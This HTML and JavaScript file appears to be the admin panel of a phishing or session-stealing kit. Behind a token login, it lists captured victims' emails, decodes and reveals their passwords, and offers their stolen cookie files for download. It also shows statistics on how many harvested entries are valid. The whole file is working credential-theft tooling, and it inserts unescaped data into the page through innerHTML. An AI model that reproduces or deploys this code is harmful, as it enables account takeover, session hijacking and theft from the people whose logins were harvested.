<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Admin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: #0078d4;
            color: white;
            padding: 20px;
            text-align: center;
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
        }

        .sessions-table {
            width: 100%;
            border-collapse: collapse;
        }

        .sessions-table th {
            background: #f8f9fa;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            color: #333;
            border-bottom: 2px solid #e9ecef;
        }

        .sessions-table td {
            padding: 15px;
            border-bottom: 1px solid #e9ecef;
            vertical-align: middle;
        }

        .sessions-table tr:hover {
            background: #f8f9fa;
        }

        .email-cell {
            font-weight: 500;
            color: #0078d4;
        }

        .password-cell {
            font-family: monospace;
            background: #f8f9fa;
            padding: 8px;
            border-radius: 4px;
            font-size: 12px;
            word-break: break-all;
        }

        .download-btn {
            background: #28a745;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-size: 13px;
        }

        .download-btn:hover {
            background: #218838;
        }

        .no-sessions {
            text-align: center;
            padding: 40px;
            color: #666;
            font-style: italic;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }

        .error {
            text-align: center;
            padding: 40px;
            color: #d32f2f;
        }

        .session-info {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
        }

        .auth-section {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 20px;
            margin: 20px;
            border-radius: 6px;
        }

        .auth-section.authenticated {
            background: #d4edda;
            border-color: #c3e6cb;
        }

        .token-input {
            width: 300px;
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-right: 10px;
            font-family: monospace;
        }

        .auth-btn {
            background: #007bff;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .auth-btn:hover {
            background: #0056b3;
        }

        .logout-btn {
            background: #dc3545;
            margin-left: 10px;
        }

        .logout-btn:hover {
            background: #c82333;
        }

        .password-container {
            position: relative;
            display: inline-block;
            width: 100%;
        }

        .password-masked {
            font-family: monospace;
            background: #f8f9fa;
            padding: 8px;
            border-radius: 4px;
            font-size: 12px;
            letter-spacing: 2px;
            color: #666;
        }

        .password-revealed {
            font-family: monospace;
            background: #fff3cd;
            padding: 8px;
            border-radius: 4px;
            font-size: 12px;
            word-break: break-all;
            border: 1px solid #ffeaa7;
        }

        .reveal-btn {
            background: #6c757d;
            color: white;
            padding: 4px 8px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px;
            margin-left: 8px;
        }

        .reveal-btn:hover {
            background: #5a6268;
        }

        .auth-status {
            margin-bottom: 15px;
            font-weight: 500;
        }

        /* Dashboard Styles */
        .dashboard-section {
            padding: 20px;
            background: #f8f9fa;
            border-bottom: 1px solid #e9ecef;
        }

        .dashboard-title {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin: 0 0 20px 0;
        }

        .sessions-header {
            padding: 20px 20px 0 20px;
        }

        .sessions-header h2 {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin: 0;
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 10px;
        }

        .dashboard-card {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-left: 4px solid #0078d4;
            display: flex;
            align-items: center;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .dashboard-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
        }

        .dashboard-card.success {
            border-left-color: #28a745;
        }

        .dashboard-card.error {
            border-left-color: #dc3545;
        }

        .dashboard-card.info {
            border-left-color: #17a2b8;
        }

        .dashboard-card-icon {
            font-size: 24px;
            margin-right: 15px;
        }

        .dashboard-card-content {
            flex: 1;
        }

        .dashboard-card-number {
            font-size: 28px;
            font-weight: 700;
            color: #333;
            line-height: 1;
            margin-bottom: 5px;
        }

        .dashboard-card-label {
            font-size: 14px;
            color: #666;
            font-weight: 500;
        }

        .dashboard-loading {
            text-align: center;
            padding: 20px;
            color: #666;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Admin Dashboard</h1>
        </div>

        <!-- Analytics Dashboard -->
        <div id="dashboard-section" class="dashboard-section">
            <h2 class="dashboard-title">Analytics Overview</h2>
            <div class="dashboard-grid">
                <div class="dashboard-card">
                    <div class="dashboard-card-icon">üìä</div>
                    <div class="dashboard-card-content">
                        <div class="dashboard-card-number" id="total-visits">-</div>
                        <div class="dashboard-card-label">Total Visits</div>
                    </div>
                </div>
                <div class="dashboard-card success">
                    <div class="dashboard-card-icon">‚úÖ</div>
                    <div class="dashboard-card-content">
                        <div class="dashboard-card-number" id="valid-entries">-</div>
                        <div class="dashboard-card-label">Valid Entries</div>
                    </div>
                </div>
                <div class="dashboard-card error">
                    <div class="dashboard-card-icon">‚ùå</div>
                    <div class="dashboard-card-content">
                        <div class="dashboard-card-number" id="invalid-entries">-</div>
                        <div class="dashboard-card-label">Invalid Entries</div>
                    </div>
                </div>
                <div class="dashboard-card info">
                    <div class="dashboard-card-icon">üìà</div>
                    <div class="dashboard-card-content">
                        <div class="dashboard-card-number" id="success-rate">-</div>
                        <div class="dashboard-card-label">Success Rate</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Sessions Section -->
        <div class="sessions-header">
            <h2>Saved Login Sessions</h2>
        </div>

        <div id="auth-section" class="auth-section">
            <div class="auth-status" id="auth-status">
                üîí Authentication required to access admin panel
            </div>
            <div id="auth-form">
                <input type="password" 
                       id="token-input" 
                       class="token-input" 
                       placeholder="Enter admin token..." 
                       onkeypress="if(event.key==='Enter') authenticate()">
                <button onclick="authenticate()" class="auth-btn">Authenticate</button>
            </div>
            <div id="auth-success" style="display: none;">
                ‚úÖ Authenticated successfully
                <button onclick="logout()" class="auth-btn logout-btn">Logout</button>
            </div>
        </div>

        <div id="loading" class="loading">
            Loading sessions...
        </div>

        <div id="error" class="error" style="display: none;">
            Error loading sessions
        </div>

        <div id="sessions-content" style="display: none;">
            <table class="sessions-table">
                <thead>
                    <tr>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Cookies File</th>
                        <th>Session Info</th>
                    </tr>
                </thead>
                <tbody id="sessions-tbody">
                </tbody>
            </table>
        </div>

        <div id="no-sessions" class="no-sessions" style="display: none;">
            No saved sessions found
        </div>
    </div>

    <script>
        // Authentication state
        let isAuthenticated = false;
        let adminToken = null;

        // Check if user is already authenticated on page load
        function checkAuthOnLoad() {
            const storedToken = localStorage.getItem('adminToken');
            if (storedToken) {
                adminToken = storedToken;
                updateAuthUI(true);
                loadSessions();
                loadAnalytics();
            } else {
                updateAuthUI(false);
            }
        }

        // Update authentication UI
        function updateAuthUI(authenticated) {
            isAuthenticated = authenticated;
            const authSection = document.getElementById('auth-section');
            const authForm = document.getElementById('auth-form');
            const authSuccess = document.getElementById('auth-success');
            const authStatus = document.getElementById('auth-status');
            const loading = document.getElementById('loading');
            const sessionsContent = document.getElementById('sessions-content');
            const noSessions = document.getElementById('no-sessions');

            if (authenticated) {
                authSection.classList.add('authenticated');
                authForm.style.display = 'none';
                authSuccess.style.display = 'block';
                authStatus.textContent = '‚úÖ Authenticated successfully';
                loading.style.display = 'block';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
            } else {
                authSection.classList.remove('authenticated');
                authForm.style.display = 'block';
                authSuccess.style.display = 'none';
                authStatus.textContent = 'üîí Authentication required to access admin panel';
                loading.style.display = 'none';
                sessionsContent.style.display = 'none';
                noSessions.style.display = 'none';
                document.getElementById('error').style.display = 'none';
            }
        }

        // Authenticate with token
        async function authenticate() {
            const tokenInput = document.getElementById('token-input');
            const token = tokenInput.value.trim();

            if (!token) {
                alert('Please enter an admin token');
                return;
            }

            try {
                // Test the token by making a request to the sessions endpoint
                const response = await fetch('/api/admin/sessions?token=' + encodeURIComponent(token));
                
                if (response.ok) {
                    adminToken = token;
                    localStorage.setItem('adminToken', token);
                    updateAuthUI(true);
                    loadSessions();
                    tokenInput.value = '';
                } else if (response.status === 401) {
                    alert('Invalid admin token. Please check and try again.');
                } else {
                    alert('Authentication failed. Please try again.');
                }
            } catch (error) {
                console.error('Authentication error:', error);
                alert('Network error during authentication. Please try again.');
            }
        }

        // Logout
        function logout() {
            adminToken = null;
            localStorage.removeItem('adminToken');
            updateAuthUI(false);
        }

        // Get stored token for API calls
        function getStoredToken() {
            return adminToken || localStorage.getItem('adminToken') || '';
        }

        // Toggle password visibility
        function togglePassword(index, password) {
            const passwordDiv = document.getElementById(`password-${index}`);
            const button = document.getElementById(`reveal-btn-${index}`);
            
            if (passwordDiv.classList.contains('password-masked')) {
                // Reveal password
                passwordDiv.className = 'password-revealed';
                passwordDiv.textContent = password;
                button.textContent = 'Hide';
            } else {
                // Hide password
                passwordDiv.className = 'password-masked';
                const passwordMask = '‚Ä¢'.repeat(Math.min(password.length, 12));
                passwordDiv.textContent = passwordMask;
                button.textContent = 'Show';
            }
        }

        async function loadSessions() {
            if (!isAuthenticated) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/sessions?token=${encodeURIComponent(token)}`);
                
                if (response.status === 401) {
                    // Token expired or invalid
                    logout();
                    alert('Authentication expired. Please log in again.');
                    return;
                }

                const sessions = await response.json();

                document.getElementById('loading').style.display = 'none';

                if (!sessions.sessions || sessions.sessions.length === 0) {
                    document.getElementById('no-sessions').style.display = 'block';
                    return;
                }

                const tbody = document.getElementById('sessions-tbody');
                tbody.innerHTML = '';

                sessions.sessions.forEach((session, index) => {
                    const row = document.createElement('tr');
                    
                    // Decode base64 password
                    let decodedPassword = session.password;
                    try {
                        decodedPassword = atob(session.password);
                    } catch (e) {
                        decodedPassword = session.password;
                    }

                    const passwordMask = '‚Ä¢'.repeat(Math.min(decodedPassword.length, 12));

                    row.innerHTML = `
                        <td class="email-cell">${session.email}</td>
                        <td>
                            <div class="password-container">
                                <div id="password-${index}" class="password-masked">
                                    ${passwordMask}
                                </div>
                                <button onclick="togglePassword(${index}, '${decodedPassword.replace(/'/g, "\\'")}')"
                                    id="reveal-btn-${index}" class="reveal-btn">Show</button>
                            </div>
                        </td>
                        <td>
                            <a href="/api/admin/download/${session.filename}?token=${encodeURIComponent(getStoredToken())}" 
                               class="download-btn" download>
                                Download Cookies
                            </a>
                        </td>
                        <td>
                            <div>ID: ${session.id}</div>
                            <div class="session-info">
                                ${new Date(session.timestamp).toLocaleString()}
                            </div>
                            <div class="session-info">
                                ${session.totalCookies} cookies
                            </div>
                        </td>
                    `;
                    
                    tbody.appendChild(row);
                });

                document.getElementById('sessions-content').style.display = 'block';

            } catch (error) {
                console.error('Error loading sessions:', error);
                document.getElementById('loading').style.display = 'none';
                const errorDiv = document.getElementById('error');
                errorDiv.textContent = `Error loading sessions: ${error.message}`;
                errorDiv.style.display = 'block';
            }
        }

        // Load analytics data
        async function loadAnalytics() {
            if (!isAuthenticated) {
                return;
            }

            try {
                const token = getStoredToken();
                const response = await fetch(`/api/admin/analytics?token=${encodeURIComponent(token)}`);
                
                if (response.status === 401) {
                    logout();
                    return;
                }

                const analytics = await response.json();
                
                // Update dashboard cards
                document.getElementById('total-visits').textContent = analytics.totalVisits || 0;
                document.getElementById('valid-entries').textContent = analytics.validEntries || 0;
                document.getElementById('invalid-entries').textContent = analytics.invalidEntries || 0;
                
                // Calculate success rate
                const total = (analytics.validEntries || 0) + (analytics.invalidEntries || 0);
                const successRate = total > 0 ? Math.round((analytics.validEntries / total) * 100) : 0;
                document.getElementById('success-rate').textContent = successRate + '%';

            } catch (error) {
                console.error('Error loading analytics:', error);
                // Set default values on error
                document.getElementById('total-visits').textContent = '0';
                document.getElementById('valid-entries').textContent = '0';
                document.getElementById('invalid-entries').textContent = '0';
                document.getElementById('success-rate').textContent = '0%';
            }
        }

        // Load authentication state when page loads
        document.addEventListener('DOMContentLoaded', checkAuthOnLoad);

        // Refresh every 30 seconds (only if authenticated)
        setInterval(() => {
            if (isAuthenticated) {
                loadSessions();
                loadAnalytics();
            }
        }, 30000);
    </script>
</body>
</html>